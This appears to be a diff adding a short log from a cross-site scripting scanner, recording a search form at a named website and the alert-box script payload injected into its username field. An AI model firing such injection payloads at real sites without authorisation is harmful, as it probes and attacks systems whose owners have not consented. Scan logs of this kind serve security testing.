@@ -1,0 +1,4 @@
+URL: http://www.ffu.com/search.php
+Form Details:{'action': '', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'username', 'value': "<script>alert('FFU XSS')</script>"}]}
+Loaded Payload: <script>alert('FFU XSS')</script>
+----------------------------
